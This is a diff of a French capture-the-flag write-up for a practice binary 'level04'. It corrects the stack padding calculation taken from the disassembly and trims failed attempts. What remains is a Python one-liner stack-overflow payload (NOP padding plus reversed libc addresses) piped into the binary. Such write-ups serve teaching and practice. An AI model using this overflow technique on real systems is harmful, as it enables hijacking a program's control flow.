@@ -180,37 +180,14 @@ Je peux soustraire `esp` d'`ebp` : `0xffffd718 - 0xffffd660 = 184` bytes, auquel
 
 ```h
    0x080486db <+19>:    mov    %eax,0xac(%esp)
-   0x080486e2 <+26>:    lea    0x20(%esp),%ebx
+   0x080486e2 <+26>:    lea    0x20(%esp),%ebx <-------- buffer declaration here
    0x080486e6 <+30>:    mov    $0x0,%eax
 ```
 
-Soit `184 - (0x20 ou 32) = 144` bytes.
+Soit `184 - 0x20 = 184 - 32 = 152` bytes.
+Comme pour le `level01`, j'ajoute 4 bytes (pour écrire sur la `return address` de main).
 
-Comme pour le `level01`, j'ajoute 8 bytes (4 pour écrire sur `ebp`, puis 4 pour écrire sur la `return address` de main).
-
-Cela me donne un total de 152 bytes de padding. J'essaye le même payload que dans le `level01` : 
-
-```bash
-$ (python -c 'print("\x90" * 152 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1])'; cat) | ./level04
-Give me some shellcode, k
-child is exiting...
-whoami
-$
-```
-
-Mais c'est sans succès. Je tente d'aligner sur 16 bytes comme précédamment :
-
-```bash
-$ (python -c 'print("\x90" * 160 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1])'; cat) | ./level04
-Give me some shellcode, k
-whoami
-
-^C
-```
-
-Sans succès également. En examinant l'ASM à nouveau, je me rend compte que contrairement au `level01`, il y a un call à `fork()` avant l'allocation du buffer, il est donc probable que l'adresse de retour de `fork()` ait été push dans la stack, et occupe donc 4 bytes supplémentaire.
-
-Je tente avec 152 + 4 bytes :
+Cela me donne un total de 156 bytes de padding. J'essaye le même payload que dans le `level01` : 
 
 ```bash
 $ (python -c 'print("\x90" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1])'; cat) | ./level04
